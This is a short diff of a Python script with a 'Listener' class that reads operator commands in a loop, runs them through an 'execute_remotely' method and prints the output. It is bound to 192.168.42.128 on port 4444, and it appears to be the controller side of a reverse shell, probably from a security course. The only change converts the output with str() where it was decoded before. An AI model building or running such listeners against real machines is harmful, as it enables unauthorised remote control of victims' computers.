@@ -28,7 +28,7 @@ class Listener:
     def run(self):
         while True:
             command = input(">> ")
-            print(self.execute_remotely(command).decode())
+            print(str(self.execute_remotely(command)))
 
 
 my_listener = Listener("192.168.42.128", 4444)
